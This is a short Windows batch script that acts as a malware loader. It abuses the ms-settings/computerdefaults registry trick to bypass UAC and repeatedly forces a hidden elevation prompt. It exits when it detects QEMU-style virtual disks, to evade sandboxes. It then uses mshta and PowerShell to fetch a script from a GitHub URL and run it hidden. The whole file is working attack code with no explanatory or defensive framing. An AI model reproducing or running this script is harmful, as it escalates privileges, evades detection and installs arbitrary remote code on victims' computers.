@echo off
cd /d "%~dp0"
net session >nul 2>&1
if %errorlevel% neq 0 (
    reg add hkcu\Software\Classes\ms-settings\shell\open\command /d "%~f0" /f
    if %errorlevel% == 0 exit /b %errorlevel%
    reg add hkcu\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f
    if %errorlevel% == 0 exit /b %errorlevel%
    computerdefaults
    if %errorlevel% == 0 exit /b %errorlevel%
    reg delete hkcu\Software\Classes\ms-settings /f
    if %errorlevel% == 0 exit /b %errorlevel%
)
net session >nul 2>&1
if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -WindowStyle Hidden -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
powershell "$d = wmic diskdrive get model;if ($d -like '*DADY HARDDISK*' -or $d -like '*QEMU HARDDISK*') { taskkill /f /im cmd.exe }"
:: hmmm nothing
mshta vbscript:CreateObject("WScript.Shell").Run("powershell -command ""iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1') | iex""",0)(window.close)
